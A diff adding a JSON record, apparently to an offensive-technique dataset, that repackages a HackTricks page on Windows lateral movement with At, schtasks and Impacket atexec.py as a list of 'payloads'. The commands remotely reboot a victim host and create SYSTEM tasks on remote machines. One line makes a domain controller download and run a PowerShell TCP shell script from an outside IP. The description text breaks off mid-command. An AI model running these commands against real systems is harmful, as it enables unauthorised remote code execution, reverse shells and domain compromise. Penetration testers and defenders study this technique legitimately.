@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_85b852253075",
+  "category": "windows-hardening",
+  "title": "atexec",
+  "description": "# AtExec / SchtasksExec\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## How Does it works\n\nAt allows to schedule tasks in hosts where you know username/(password/Hash). So, you can use it to execute commands in other hosts and get the output.\n\n```\nAt \\\\victim 11:00:00PM shutdown -r\n```\n\nUsing schtasks you need first to create the task and then call it:\n\n```bash\nschtasks /create /n <TASK_NAME> /tr C:\\path\\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System\nschtasks /run /tn <TASK_NAME",
+  "payloads": [
+    "# AtExec / SchtasksExec",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## How Does it works",
+    "At allows to schedule tasks in hosts where you know username/(password/Hash). So, you can use it to execute commands in other hosts and get the output.",
+    "At \\\\victim 11:00:00PM shutdown -r",
+    "Using schtasks you need first to create the task and then call it:",
+    "```bash",
+    "schtasks /create /n <TASK_NAME> /tr C:\\path\\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System",
+    "schtasks /run /tn <TASK_NAME> /S <VICTIM>",
+    "```bash",
+    "schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU \"NT Authority\\SYSTEM\" /TN \"MyNewtask\" /TR \"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'\"",
+    "schtasks /run /tn \"MyNewtask\" /S dcorp-dc.domain.local",
+    "You can use **Impacket's `atexec.py`** to execute commands on remote systems using the AT command. This requires valid credentials (username and password or hash) for the target system.",
+    "```bash",
+    "atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/lateral-movement/atexec.md"
+  ]
+}
